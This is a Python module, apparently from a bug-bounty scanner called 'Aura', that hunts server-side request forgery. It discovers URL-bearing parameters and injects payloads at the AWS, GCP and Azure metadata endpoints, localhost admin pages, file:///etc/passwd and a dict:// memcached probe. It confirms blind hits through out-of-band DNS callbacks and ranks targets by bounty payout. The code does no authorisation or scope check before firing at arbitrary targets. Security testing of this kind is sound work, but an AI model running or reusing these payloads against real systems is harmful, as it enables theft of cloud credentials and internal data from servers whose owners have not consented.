"""
Aura v22.0 — SSRF Hunter + OAST Confirmer (Tier 2 — Highest ROI)
Server-Side Request Forgery detection with blind SSRF confirmation.

Why SSRF is king:
  - AWS Metadata endpoint → CRITICAL → $5,000-$15,000
  - Confirmed blind SSRF (OAST callback) → always accepted
  - Easy to find, hard for devs to notice

Strategy:
  1. Discover all URL-bearing parameters
  2. Inject internal/OAST targets
  3. Confirm via DNS callback (Interactsh) or direct response
"""
import re
import asyncio
import urllib.parse
from rich.console import Console
from aura.core import state

console = Console()

# Parameters likely to accept URLs
URL_PARAMS = [
    "url", "redirect", "img", "image", "path", "file", "link", "src", "href",
    "resource", "target", "dest", "destination", "return", "returnUrl",
    "next", "callback", "webhook", "endpoint", "proxy", "fetch", "load",
    "uri", "location", "ref", "origin", "host", "domain", "page", "view",
]

# SSRF test payloads
SSRF_PAYLOADS = [
    ("AWS Metadata",      "http://169.254.169.254/latest/meta-data/", "ami-id"),
    ("GCP Metadata",      "http://metadata.google.internal/computeMetadata/v1/", ""),
    ("Azure Metadata",    "http://169.254.169.254/metadata/instance", "compute"),
    ("Localhost Admin",   "http://localhost/admin",                  "admin"),
    ("Localhost 8080",    "http://127.0.0.1:8080/",                 ""),
    ("Internal 192.168",  "http://192.168.1.1/",                    ""),
    ("File Read",         "file:///etc/passwd",                      "root:"),
    ("Dict Protocol",     "dict://localhost:11211/stats",            "STAT"),
]


class SSRFHunter:
    """
    Tier 2: SSRF Hunter with OAST-based blind confirmation.
    Discovers URL parameters, tests SSRF payloads, and confirms
    via response content OR Interactsh DNS callback.
    """

    OAST_CATCHER = None
    OAST_URL = None

    def __init__(self, session=None, oast_domain: str = None):
        self.session = session
        self._try_load_oast()

    def _try_load_oast(self):
        """Try to pick up existing OAST domain from Aura's oast module."""
        try:
            from aura.modules.oast import OastCatcher
            self.OAST_CATCHER = OastCatcher()
            url = self.OAST_CATCHER.setup()
            if url:
                self.OAST_URL = url
        except Exception as e:
            console.print(f"[dim red]Failed to load OAST: {e}[/dim red]")

    @staticmethod
    def _extract_url_params(url: str) -> list[tuple[str, str]]:
        """Returns (param_name, current_value) for all URL-like parameters."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        found = []
        for name, values in params.items():
            if name.lower() in URL_PARAMS or any(
                kw in name.lower() for kw in ["url", "uri", "path", "link", "redirect", "host"]
            ):
                found.append((name, values[0] if values else ""))
        return found

    async def _probe(self, url: str, method: str = "GET", data: dict = None) -> tuple[int, str]:
        """Makes a request and returns (status_code, body)."""
        try:
            if method == "GET":
                res = await self.session.get(url, timeout=state.NETWORK_TIMEOUT)
            else:
                res = await self.session.post(url, data=data or {}, timeout=state.NETWORK_TIMEOUT)
            if res:
                return res.status_code, res.text or ""
        except Exception:
            pass
        return 0, ""

    async def _test_ssrf_param(self, base_url: str, param_name: str, original_val: str) -> list[dict]:
        """Tests a single URL parameter for SSRF with all payloads."""
        findings = []
        parsed   = urllib.parse.urlparse(base_url)

        for payload_name, payload_url, confirm_str in SSRF_PAYLOADS:
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[param_name] = [payload_url]
            new_query  = urllib.parse.urlencode(qs, doseq=True)
            target_url = parsed._replace(query=new_query).geturl()

            status, body = await self._probe(target_url)

            # Direct SSRF confirmation — response contains expected content
            if confirm_str and confirm_str.lower() in body.lower() and status == 200:
                severity = "CRITICAL" if "169.254.169.254" in payload_url or "metadata" in payload_url else "HIGH"
                cvss     = 9.8 if severity == "CRITICAL" else 8.6

                console.print(f"[bold red][SSRF CONFIRMED] {payload_name} via {param_name} on {base_url}![/bold red]")
                findings.append(self._make_finding(
                    vuln_type=f"SSRF: {payload_name}",
                    severity=severity,
                    cvss=cvss,
                    url=base_url,
                    param=param_name,
                    payload=payload_url,
                    proof=f"Response contained '{confirm_str}': {body[:300]}",
                    confirmed=True,
                ))
                break

        # Blind SSRF via OAST DNS callback
        if not findings and self.OAST_URL:
            # v38.0: Unique OAST Correlation
            oast_payload = self.OAST_CATCHER.get_payload("SSRFHunter", base_url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[param_name] = [oast_payload]
            new_query  = urllib.parse.urlencode(qs, doseq=True)
            target_url = parsed._replace(query=new_query).geturl()

            console.print(f"[dim yellow][SSRF] Sending unique OAST probe via {param_name}...[/dim yellow]")
            await self._probe(target_url)
            
            # v38.0: The background loop in NeuralOrchestrator will handle detection and logging.
            # We no longer need to sleep or local-poll here.
        
        return findings


    @staticmethod
    def _make_finding(vuln_type, severity, cvss, url, param, payload, proof, confirmed) -> dict:
        return {
            "type": vuln_type,
            "severity": severity,
            "cvss_score": cvss,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "owasp": "A10:2021-Server-Side Request Forgery",
            "mitre": "T1090 - Proxy / T1552 - Unsecured Credentials",
            "content": (
                f"SSRF via `{param}` parameter on `{url}`.\n"
                f"Payload used: `{payload}`\n"
                f"Proof: {proof}"
            ),
            "payload": payload,
            "raw_request": f"GET {url}?{param}={payload}\nHost: {urllib.parse.urlparse(url).netloc}",
            "proof": proof,
            "remediation_fix": (
                "1. Validate and sanitize all URL inputs on the server side.\n"
                "2. Use an allowlist of permitted domains/IPs.\n"
                "3. Disable unused URL schemes (file://, dict://, gopher://).\n"
                "4. Block access to 169.254.169.254 (cloud metadata) via firewall.\n"
                "5. Consider using a dedicated outbound HTTP client with strict controls."
            ),
            "impact_desc": (
                "SSRF allows attackers to make the server issue requests to internal services. "
                "On cloud environments, this leads to metadata theft (AWS credentials, IAM roles), "
                "enabling full cloud account takeover."
            ),
            "patch_priority": "IMMEDIATE" if severity == "CRITICAL" else "HIGH",
            "evidence_url": url,
            "confirmed": confirmed,
        }

    async def scan_urls(self, discovered_urls: list[str]) -> list[dict]:
        """Scans a list of URLs for SSRF-vulnerable parameters."""
        ssrf_candidates = [u for u in discovered_urls if self._extract_url_params(u)]
        if not ssrf_candidates:
            console.print("[dim][SSRF] No URL-bearing parameters found.[/dim]")
            return []

        console.print(f"[bold yellow][SSRF] Testing {len(ssrf_candidates)} URL parameter(s)...[/bold yellow]")
        all_findings = []

        for url in ssrf_candidates[:20]:  # Cap at 20 to avoid flooding
            params = self._extract_url_params(url)
            for param_name, val in params:
                results = await self._test_ssrf_param(url, param_name, val)
                all_findings.extend(results)

        confirmed = [f for f in all_findings if f.get("confirmed")]
        if confirmed:
            console.print(f"[bold red][SSRF] {len(confirmed)} SSRF(s) CONFIRMED with physical evidence![/bold red]")
            return confirmed
        else:
            console.print("[dim green][SSRF] No SSRF vulnerabilities successfully verified Out-of-Band.[/dim green]")
            return []

    async def scan_target(self, base_url: str) -> list[dict]:
        """
        Scans a base URL by discovering all pages with URL params
        and testing them for SSRF.
        """
        console.print(f"[bold yellow][SSRF] Probing {base_url} for SSRF...[/bold yellow]")

        # Quick test on the base URL itself with common param names
        findings = []
        parsed   = urllib.parse.urlparse(base_url)
        origin   = f"{parsed.scheme}://{parsed.netloc}"

        # Inject test params directly on known endpoint patterns
        test_urls = [
            f"{origin}/?url=",
            f"{origin}/?redirect=",
            f"{origin}/api/proxy?url=",
            f"{origin}/fetch?url=",
            f"{origin}/download?path=",
        ]

        for test_url in test_urls:
            for param_name in ["url", "redirect", "path", "fetch"]:
                if f"?{param_name}=" in test_url or f"&{param_name}=" in test_url:
                    if test_url.endswith("="):
                        results = await self._test_ssrf_param(
                            test_url.replace(f"?{param_name}=", f"?{param_name}=PLACEHOLDER"),
                            param_name, "PLACEHOLDER"
                        )
                        findings.extend(results)

        return findings
